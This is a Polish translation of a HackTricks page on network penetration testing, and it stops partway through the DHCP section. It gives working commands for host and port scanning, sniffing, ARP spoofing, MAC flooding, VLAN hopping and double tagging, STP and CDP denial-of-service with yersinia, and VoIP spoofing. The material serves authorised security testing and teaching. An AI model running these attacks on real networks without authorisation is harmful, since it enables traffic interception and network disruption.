# Testowanie penetracyjne sieci

<details>

<summary><strong>Nauka hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Kup [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakowania, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Wskazówka dotycząca nagrody za błąd**: **Zarejestruj się** na platformie **Intigriti**, premium **platformie do nagród za błędy stworzonej przez hakerów, dla hakerów**! Dołącz do nas na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) już dziś i zacznij zarabiać nagrody do **100 000 USD**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Odkrywanie hostów z zewnątrz

To będzie **krótka sekcja** dotycząca sposobów znajdowania **odpowiadających adresów IP** z **Internetu**.\
W tej sytuacji masz pewien **zakres adresów IP** (może nawet kilka **zakresów**) i chcesz po prostu dowiedzieć się, **które adresy IP odpowiadają**.

### ICMP

To jest **najłatwiejszy** i **najszybszy** sposób na odkrycie, czy host jest aktywny, czy nie.\
Możesz spróbować wysłać kilka pakietów **ICMP** i **oczekiwać odpowiedzi**. Najprostszym sposobem jest wysłanie **żądania echo** i oczekiwanie na odpowiedź. Możesz to zrobić za pomocą prostego polecenia `ping` lub używając `fping` do **zakresów**.\
Możesz także użyć **nmap** do wysyłania innych rodzajów pakietów ICMP (to pozwoli ominąć filtry dla standardowego żądania-odpowiedzi echo ICMP).
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### Odkrywanie portów TCP

Bardzo często zdarza się, że wszystkie rodzaje pakietów ICMP są filtrowane. W takim przypadku jedyną rzeczą, którą możesz zrobić, aby sprawdzić, czy host jest aktywny, jest **sprawdzenie otwartych portów**. Każdy host ma **65535 portów**, więc jeśli masz "duży" zakres, **nie możesz** testować, czy **każdy port** każdego hosta jest otwarty czy nie, ponieważ zajęłoby to zbyt dużo czasu.\
W takim przypadku potrzebujesz **szybkiego skanera portów** ([masscan](https://github.com/robertdavidgraham/masscan)) oraz listy **najczęściej używanych portów:**
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
### Odkrywanie portów HTTP

Jest to po prostu odkrywanie portów TCP przydatne, gdy chcesz **skupić się na odkrywaniu usług HTTP**:
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### Odkrywanie portów UDP

Możesz również spróbować sprawdzić, czy **jest otwarty port UDP**, aby zdecydować, czy powinieneś **zwrócić większą uwagę** na **hosta.** Ponieważ usługi UDP zazwyczaj **nie odpowiadają** **żadnymi danymi** na zwykły pusty pakiet sondy UDP, trudno powiedzieć, czy port jest filtrowany czy otwarty. Najprostszym sposobem na podjęcie decyzji jest wysłanie pakietu związane z działającą usługą, a ponieważ nie wiesz, która usługa jest uruchomiona, powinieneś spróbować najbardziej prawdopodobnej na podstawie numeru portu:
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
Linia nmap zaproponowana wcześniej przetestuje **top 1000 portów UDP** w każdym hoście w zakresie **/24**, ale nawet to zajmie **>20 minut**. Jeśli potrzebujesz **szybkich wyników**, możesz użyć [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner): `./udp-proto-scanner.pl 199.66.11.53/24` To wyśle te **sondy UDP** do ich **oczekiwanych portów** (dla zakresu /24 zajmie to tylko 1 minutę): _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### Odkrywanie portów SCTP
```bash
#Probably useless, but it's pretty fast, why not trying?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Testowanie penetracyjne Wifi

Tutaj znajdziesz ładny przewodnik po wszystkich dobrze znanych atakach na Wifi w czasie pisania:

{% content-ref url="../pentesting-wifi/" %}
[pentesting-wifi](../pentesting-wifi/)
{% endcontent-ref %}

## Odkrywanie hostów od wewnątrz

Jeśli jesteś wewnątrz sieci, jedną z pierwszych rzeczy, które chcesz zrobić, jest **odkrycie innych hostów**. W zależności od **tego, jak wiele hałasu** możesz/chcesz zrobić, można wykonać różne działania:

### Pasywny

Możesz użyć tych narzędzi do pasywnego odkrywania hostów w połączonej sieci:
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### Aktywne

Zauważ, że techniki omówione w [_**Odkrywanie hostów z zewnątrz**_](./#discovering-hosts-from-the-outside) (_Odkrywanie portów TCP/HTTP/UDP/SCTP_) mogą być również **zastosowane tutaj**.\
Jednak, ponieważ znajdujesz się w **tym samym sieci**, co inne hosty, możesz zrobić **więcej rzeczy**:
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### Aktywne ICMP

Zauważ, że techniki omówione w _Odkrywanie hostów z zewnątrz_ ([_**ICMP**_](./#icmp)) mogą być również **stosowane tutaj**.\
Jednak, ponieważ jesteś w **takiej samej sieci** jak inne hosty, możesz zrobić **więcej rzeczy**:

* Jeśli **pingujesz** **adres rozgłoszeniowy podsieci**, ping powinien dotrzeć do **każdego hosta** i mogą oni **odpowiedzieć** do **Ciebie**: `ping -b 10.10.5.255`
* Pingując **adres rozgłoszeniowy sieci**, możesz nawet znaleźć hosty wewnątrz **innych podsieci**: `ping -b 255.255.255.255`
* Użyj flag `-PE`, `-PP`, `-PM` narzędzia `nmap` do przeprowadzenia odkrywania hostów wysyłając odpowiednio żądania **ICMPv4 echo**, **znacznik czasu** i **maskę podsieci:** `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Budzenie przez sieć (Wake On Lan)**

Budzenie przez sieć (Wake On Lan) służy do **włączania** komputerów za pomocą **wiadomości sieciowej**. Pakiet magiczny używany do włączenia komputera to po prostu pakiet, w którym podany jest **MAC Dst**, a następnie jest **powtarzany 16 razy** w tym samym pakiecie.\
Następnie tego rodzaju pakiety są zazwyczaj wysyłane w ramce **ethernet 0x0842** lub w pakiecie **UDP na port 9**.\
Jeśli nie jest podany **żaden \[MAC]**, pakiet jest wysyłany do **rozgłoszeniowego ethernetu** (a rozgłoszeniowy MAC będzie powtarzany).
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## Skanowanie hostów

Po odkryciu wszystkich adresów IP (zewnętrznych lub wewnętrznych), które chcesz dokładnie zeskanować, można wykonać różne działania.

### TCP

* **Otwarty** port: _SYN --> SYN/ACK --> RST_
* **Zamknięty** port: _SYN --> RST/ACK_
* **Filtrowany** port: _SYN --> \[BRAK ODPOWIEDZI]_
* **Filtrowany** port: _SYN --> Wiadomość ICMP_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

Istnieją 2 opcje skanowania portu UDP:

* Wyślij **pakiet UDP** i sprawdź odpowiedź _**ICMP unreachable**_, jeśli port jest **zamknięty** (w wielu przypadkach ICMP będzie **filtrowany**, więc nie otrzymasz żadnych informacji, czy port jest zamknięty czy otwarty).
* Wyślij **sformatowane datagramy**, aby wywołać odpowiedź z **usługi** (np. DNS, DHCP, TFTP i inne, jak wymienione w _nmap-payloads_). Jeśli otrzymasz **odpowiedź**, to port jest **otwarty**.

**Nmap** będzie **łączył obie** opcje, używając "-sV" (skany UDP są bardzo wolne), ale zauważ, że skany UDP są wolniejsze niż skany TCP:
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### Skanowanie SCTP

**SCTP (Protokół transmisji sterowanej strumieniem)** został zaprojektowany do użytku obok **TCP (Protokół sterowania transmisją)** i **UDP (Protokół datagramów użytkownika)**. Jego głównym celem jest ułatwienie transportu danych telefonicznych w sieciach IP, odzwierciedlając wiele cech niezawodności znalezionych w **Systemie sygnalizacyjnym 7 (SS7)**. **SCTP** jest podstawowym składnikiem rodziny protokołów **SIGTRAN**, które mają na celu transport sygnałów SS7 w sieciach IP.

Wsparcie dla **SCTP** jest dostarczane przez różne systemy operacyjne, takie jak **IBM AIX**, **Oracle Solaris**, **HP-UX**, **Linux**, **Cisco IOS** i **VxWorks**, co wskazuje na jego szerokie akceptowanie i użyteczność w dziedzinie telekomunikacji i sieci.

Nmap oferuje dwa różne skany dla SCTP: _-sY_ i _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### Unikanie wykrycia przez IDS i IPS

{% content-ref url="ids-evasion.md" %}
[ids-evasion.md](ids-evasion.md)
{% endcontent-ref %}

### **Więcej opcji nmap**

{% content-ref url="nmap-summary-esp.md" %}
[nmap-summary-esp.md](nmap-summary-esp.md)
{% endcontent-ref %}

### Ujawnianie wewnętrznych adresów IP

**Źle skonfigurowane routery, firewalle i urządzenia sieciowe** czasami odpowiadają na sondy sieciowe, używając **niepublicznych adresów źródłowych**. **tcpdump** może być wykorzystany do identyfikacji pakietów otrzymywanych z adresów prywatnych podczas testowania. W szczególności, na Kali Linux, pakiety mogą być przechwytywane na interfejsie **eth2**, który jest dostępny z publicznego Internetu. Warto zauważyć, że jeśli twoje środowisko jest za NAT-em lub Firewallem, takie pakiety prawdopodobnie zostaną odfiltrowane.
```bash
tcpdump –nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Podsłuchiwanie

Podczas podsłuchiwania możesz dowiedzieć się szczegółów dotyczących zakresów adresów IP, rozmiarów podsieci, adresów MAC i nazw hostów, przeglądając przechwycone ramki i pakiety. Jeśli sieć jest źle skonfigurowana lub tkanina przełączająca jest obciążona, atakujący mogą przechwycić poufne materiały poprzez pasywne podsłuchiwanie sieci.

Jeśli przełączona sieć Ethernet jest poprawnie skonfigurowana, zobaczysz tylko ramki rozgłoszeniowe i materiał przeznaczony dla Twojego adresu MAC.

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
Można również przechwytywać pakiety z zdalnej maszyny podczas sesji SSH za pomocą Wireshark jako interfejsu GUI w czasie rzeczywistym.
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

Oczywiście.

### Przechwytywanie poświadczeń

Możesz użyć narzędzi takich jak [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) do analizy poświadczeń z pliku pcap lub interfejsu na żywo.

## Ataki LAN

### ARP spoofing

ARP Spoofing polega na wysyłaniu fałszywych odpowiedzi ARP w celu wskazania, że IP maszyny ma MAC naszego urządzenia. Następnie ofiara zmieni tabelę ARP i będzie kontaktować się z naszym urządzeniem za każdym razem, gdy chce skontaktować się z podszywanym adresem IP.

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### Zatapianie MAC - przepełnienie CAM

Przepełnij tabelę CAM przełącznika, wysyłając wiele pakietów z różnymi adresami MAC źródłowymi. Gdy tabela CAM jest pełna, przełącznik zaczyna zachowywać się jak koncentrator (rozsyłając cały ruch).
```bash
macof -i <interface>
```
W nowoczesnych przełącznikach ta podatność została naprawiona.

### Ataki 802.1Q VLAN / DTP

#### Dynamiczne Trunkowanie

Protokół **Dynamic Trunking Protocol (DTP)** został zaprojektowany jako protokół warstwy łącza umożliwiający automatyczny system trunkowania, pozwalając przełącznikom automatycznie wybierać porty w trybie trunk (Trunk) lub nie-trunk. Wdrożenie **DTP** jest często postrzegane jako wskazanie na suboptymalny projekt sieci, podkreślając konieczność ręcznej konfiguracji trunków tylko tam, gdzie jest to konieczne, oraz zapewnienia odpowiedniej dokumentacji.

Domyślnie porty przełącznika są ustawione na tryb Dynamic Auto, co oznacza, że są gotowe do rozpoczęcia trunkowania, jeśli zostaną do tego skłonione przez sąsiedni przełącznik. Problem związany z bezpieczeństwem pojawia się, gdy pentester lub atakujący podłącza się do przełącznika i wysyła ramkę DTP Desirable, zmuszając port do przejścia w tryb trunk. Ta czynność umożliwia atakującemu wyliczenie VLAN-ów poprzez analizę ramek STP oraz obejście segmentacji VLAN poprzez konfigurację interfejsów wirtualnych.

Obecność DTP w wielu przełącznikach domyślnie może być wykorzystana przez przeciwników do naśladowania zachowania przełącznika, co umożliwia dostęp do ruchu we wszystkich VLAN-ach. Skrypt [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) jest wykorzystywany do monitorowania interfejsu, ujawniając, czy przełącznik jest w trybie domyślnym, trunk, dynamic, auto lub access—ten ostatni jest jedyną konfiguracją odporną na ataki VLAN hopping. Narzędzie to ocenia stan podatności przełącznika.

Jeśli zidentyfikowano podatność sieciową, narzędzie _**Yersinia**_ może być wykorzystane do "włączenia trunkowania" za pomocą protokołu DTP, umożliwiając obserwację pakietów ze wszystkich VLAN-ów.
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../.gitbook/assets/image (269).png>)

Aby wyliczyć VLAN-y, można również wygenerować ramkę DTP Desirable za pomocą skryptu [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)**. N**ie przerywaj skryptu pod żadnym pozorem. Wstrzykuje on ramki DTP Desirable co trzy sekundy. **Dynamicznie tworzone kanały trunkowe na przełączniku istnieją tylko przez pięć minut. Po upływie pięciu minut kanał trunkowy znika.**
```
sudo python3 DTPHijacking.py --interface eth0
```
Chciałbym zwrócić uwagę, że **Dostępny/Żądany (0x03)** oznacza, że ramka DTP jest typu Żądany, co informuje port o przełączeniu się w tryb Trunk. Natomiast **802.1Q/802.1Q (0xa5)** wskazuje typ enkapsulacji **802.1Q**.

Analizując ramki STP, **dowiedzieliśmy się o istnieniu VLAN 30 i VLAN 60**.

<figure><img src="../../.gitbook/assets/image (124).png" alt=""><figcaption></figcaption></figure>

#### Atakowanie konkretnych VLANów

Gdy znasz identyfikatory VLAN i wartości IP, możesz **skonfigurować wirtualny interfejs do ataku na określony VLAN**.\
Jeśli DHCP nie jest dostępne, użyj _ifconfig_ do ustawienia statycznego adresu IP.
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Automatyczny skaczący VLAN

Omawiany atak **Dynamic Trunking i tworzenie wirtualnych interfejsów oraz odkrywanie hostów w innych** VLAN-ach jest **automatycznie wykonywany** przez narzędzie: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Podwójne oznakowanie

Jeśli atakujący zna wartość **MAC, IP i ID VLAN ofiary**, może spróbować **podwójnie oznakować ramkę** z jej przeznaczonym VLAN-em i VLAN-em ofiary, a następnie wysłać pakiet. Ponieważ **ofiara nie będzie mogła się połączyć z powrotem** z atakującym, najlepszą opcją dla atakującego jest komunikacja za pomocą UDP z protokołami, które mogą wykonać pewne interesujące akcje (np. SNMP).

Inną opcją dla atakującego jest uruchomienie **skanowania portów TCP podając jako źródło IP kontrolowane przez atakującego i dostępne dla ofiary** (prawdopodobnie przez internet). Następnie atakujący mógłby podsłuchiwać w drugim hostu należącym do niego, czy otrzymuje jakieś pakiety od ofiary.

![](<../../.gitbook/assets/image (190).png>)

Aby przeprowadzić ten atak, można użyć narzędzia scapy: `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Ominięcie Segmentacji VLAN Lateralna <a href="#d679" id="d679"></a>

Jeśli masz **dostęp do przełącznika, do którego jesteś bezpośrednio podłączony**, masz możliwość **ominięcia segmentacji VLAN** w sieci. Po prostu **zmień port na tryb trunk** (inaczej znany jako trunk), stwórz wirtualne interfejsy z identyfikatorami docelowych VLAN-ów i skonfiguruj adres IP. Możesz spróbować żądać adresu dynamicznie (DHCP) lub skonfigurować go statycznie. To zależy od sytuacji.

{% content-ref url="lateral-vlan-segmentation-bypass.md" %}
[lateral-vlan-segmentation-bypass.md](lateral-vlan-segmentation-bypass.md)
{% endcontent-ref %}

#### Ominięcie Prywatnego VLAN Warstwy 3

W pewnych środowiskach, takich jak sieci bezprzewodowe dla gości, ustawienia **izolacji portów (znane również jako prywatny VLAN)** są wdrożone w celu zapobieżenia bezpośredniej komunikacji klientów podłączonych do punktu dostępu bezprzewodowego. Zidentyfikowano jednak technikę, która może obejść te środki izolacji. Ta technika wykorzystuje brak list ACL sieciowych lub ich nieprawidłową konfigurację, umożliwiając przekierowanie pakietów IP przez router, aby dotrzeć do innego klienta w tej samej sieci.

Atak jest przeprowadzany poprzez stworzenie **pakietu, który przenosi adres IP docelowego klienta, ale z adresem MAC routera**. Powoduje to błędne przekierowanie pakietu przez router do klienta docelowego. Ten sposób działania jest podobny do tego używanego w atakach podwójnego znakowania, gdzie możliwość kontrolowania hosta dostępnego dla ofiary jest wykorzystywana do wykorzystania luki w zabezpieczeniach.

**Kluczowe Kroki Ataku:**

1. **Tworzenie Pakietu:** Pakiet jest specjalnie przygotowany tak, aby zawierał adres IP docelowego klienta, ale z adresem MAC routera.
2. **Wykorzystanie Zachowania Routera:** Przygotowany pakiet jest wysyłany do routera, który, ze względu na konfigurację, przekierowuje pakiet do klienta docelowego, omijając izolację zapewnioną przez ustawienia prywatnego VLAN.

### Ataki VTP

VTP (VLAN Trunking Protocol) centralizuje zarządzanie VLAN-ami. Wykorzystuje numery rewizji do utrzymania integralności bazy danych VLAN; każda modyfikacja zwiększa ten numer. Przełączniki przyjmują konfiguracje z wyższymi numerami rewizji, aktualizując swoje bazy danych VLAN.

#### Role Domeny VTP

* **Serwer VTP:** Zarządza VLAN-ami—tworzy, usuwa, modyfikuje. Wysyła ogłoszenia VTP do członków domeny.
* **Klient VTP:** Odbiera ogłoszenia VTP w celu zsynchronizowania swojej bazy danych VLAN. Ta rola jest ograniczona od modyfikacji lokalnej konfiguracji VLAN.
* **Transparentny VTP:** Nie uczestniczy w aktualizacjach VTP, ale przekazuje ogłoszenia VTP. Nie dotyczą go ataki VTP, utrzymuje stały numer rewizji równy zero.

#### Typy Ogłoszeń VTP

* **Ogłoszenie Podsumowujące:** Wysyłane przez serwer VTP co 300 sekund, przenoszące istotne informacje o domenie.
* **Ogłoszenie Podzbiór:** Wysyłane po zmianach konfiguracji VLAN.
* **Żądanie Ogłoszenia:** Wystawiane przez klienta VTP w celu żądania Ogłoszenia Podsumowującego, zazwyczaj w odpowiedzi na wykrycie wyższego numeru rewizji konfiguracji.

Układy VTP są podatne na ataki wyłącznie poprzez porty trunkowe, ponieważ ogłoszenia VTP krążą wyłącznie przez nie. Scenariusze ataków po DTP mogą skierować się w stronę VTP. Narzędzia takie jak Yersinia mogą ułatwić ataki VTP, mające na celu usunięcie bazy danych VLAN, skutecznie zakłócając sieć.

Uwaga: Ta dyskusja dotyczy wersji VTP 1 (VTPv1).
````bash
%% yersinia -G # Launch Yersinia in graphical mode ```
````
### Ataki STP

**Jeśli nie możesz przechwycić ramek BPDU na swoich interfejsach, mało prawdopodobne jest, że uda ci się przeprowadzić atak STP.**

#### **DoS BPDU STP**

Wysyłając wiele ramek BPDUs TCP (Topology Change Notification) lub Conf (BPDUs wysyłane podczas tworzenia topologii), przełączniki zostają przeciążone i przestają działać poprawnie.
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **Atak STP TCP**

Kiedy zostanie wysłane TCP, tabela CAM przełączników zostanie usunięta w ciągu 15s. Następnie, jeśli wysyłasz ciągle ten rodzaj pakietów, tabela CAM będzie ciągle restartowana (co 15 sekund) i gdy zostanie zrestartowana, przełącznik zachowuje się jak koncentrator.
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **Atak na korzeń STP**

Atakujący symuluje zachowanie przełącznika, aby stać się korzeniem STP sieci. Wtedy więcej danych będzie przechodzić przez niego. Jest to interesujące, gdy jesteś podłączony do dwóch różnych przełączników.\
Dzieje się to poprzez wysyłanie pakietów CONF BPDUs mówiących, że wartość **priorytetu** jest mniejsza niż rzeczywisty priorytet rzeczywistego przełącznika korzenia.
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**Jeśli atakujący jest podłączony do 2 przełączników, może stać się korzeniem nowego drzewa i cały ruch pomiędzy tymi przełącznikami będzie przechodził przez niego** (ataku typu MITM zostanie przeprowadzony).
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### Ataki CDP

Protokół Odkrywania CISCO (CDP) jest niezbędny do komunikacji między urządzeniami CISCO, umożliwiając im **identyfikację siebie nawzajem i udostępnianie szczegółów konfiguracji**.

#### Pasywne Zbieranie Danych <a href="#id-0e0f" id="id-0e0f"></a>

CDP jest skonfigurowany do rozgłaszania informacji przez wszystkie porty, co może prowadzić do ryzyka bezpieczeństwa. Atakujący, po podłączeniu do portu przełącznika, może zastosować narzędzia do przechwytywania sieci takie jak **Wireshark**, **tcpdump** lub **Yersinia**. Ta akcja może ujawnić wrażliwe dane na temat urządzenia sieciowego, w tym jego model i wersję systemu Cisco IOS, który jest używany. Następnie atakujący może skierować się przeciwko konkretnym podatnościom w zidentyfikowanej wersji Cisco IOS.

#### Wywoływanie Zatłoczenia Tabeli CDP <a href="#id-0d6a" id="id-0d6a"></a>

Bardziej agresywne podejście polega na uruchomieniu ataku typu Denial of Service (DoS), przytłaczając pamięć przełącznika, udając prawidłowe urządzenia CISCO. Poniżej znajduje się sekwencja poleceń do zainicjowania takiego ataku przy użyciu narzędzia sieciowego Yersinia, przeznaczonego do testowania:
```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```
Podczas tego ataku, procesor przełącznika oraz tabela sąsiadów CDP są silnie obciążone, prowadząc często do tzw. **"paraliżu sieci"** z powodu nadmiernego zużycia zasobów. 

#### Atak podszywania się pod CDP
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
Możesz również użyć [**scapy**](https://github.com/secdev/scapy/). Upewnij się, że instalujesz go z pakietem `scapy/contrib`.

### Ataki VoIP i narzędzie VoIP Hopper

Telefony VoIP, coraz bardziej zintegrowane z urządzeniami IoT, oferują funkcje takie jak otwieranie drzwi lub sterowanie termostatami za pomocą specjalnych numerów telefonów. Jednak ta integracja może stanowić ryzyko dla bezpieczeństwa.

Narzędzie [**voiphopper**](http://voiphopper.sourceforge.net) zostało zaprojektowane do emulowania telefonu VoIP w różnych środowiskach (Cisco, Avaya, Nortel, Alcatel-Lucent). Odkrywa identyfikator VLAN sieci głosowej za pomocą protokołów takich jak CDP, DHCP, LLDP-MED i 802.1Q ARP.

**VoIP Hopper** oferuje trzy tryby dla protokołu Cisco Discovery Protocol (CDP):

1. **Tryb Sniff** (`-c 0`): Analizuje pakiety sieciowe w celu zidentyfikowania identyfikatora VLAN.
2. **Tryb Spoof** (`-c 1`): Generuje niestandardowe pakiety imitujące te z rzeczywistego urządzenia VoIP.
3. **Tryb Spoof z Wcześniej Utworzonym Pakietem** (`-c 2`): Wysyła pakiety identyczne z tymi z określonego modelu telefonu IP Cisco.

Preferowany tryb dla szybkości to trzeci. Wymaga określenia:

* Interfejsu sieciowego atakującego (`-i` parametr).
* Nazwy urządzenia VoIP, które jest emulowane (`-E` parametr), zgodnie z formatem nazewnictwa Cisco (np. SEP, a następnie adres MAC).

W ustawieniach korporacyjnych, aby zasymulować istniejące urządzenie VoIP, można:

* Sprawdzić etykietę MAC na telefonie.
* Przejrzeć ustawienia wyświetlacza telefonu, aby zobaczyć informacje o modelu.
* Podłączyć urządzenie VoIP do laptopa i obserwować żądania CDP za pomocą Wireshark.

Przykładowe polecenie do wykonania narzędzia w trzecim trybie byłoby:
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
### Ataki DHCP

#### Wyliczanie
```bash
nmap --script broadcast-dhcp-discover
